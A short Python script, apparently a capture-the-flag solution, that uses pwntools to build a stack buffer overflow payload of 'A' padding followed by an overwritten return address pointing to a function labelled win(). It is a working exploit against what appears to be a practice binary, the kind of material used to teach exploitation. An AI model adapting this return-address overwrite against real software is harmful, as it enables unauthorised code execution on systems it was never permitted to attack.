from pwn import *
import sys
chain = b''
chain += pack(0x41414141, endianness='little')		# 'AAAAAAAAAAAAAAAAA'
chain += pack(0x41414141, endianness='little')
chain += pack(0x41414141, endianness='little')
chain += pack(0x41414141, endianness='little')
chain += pack(0x41, endianness='little')
chain += pack(0x80491c6, endianness='little')		# win()
sys.stdout.buffer.write(chain)
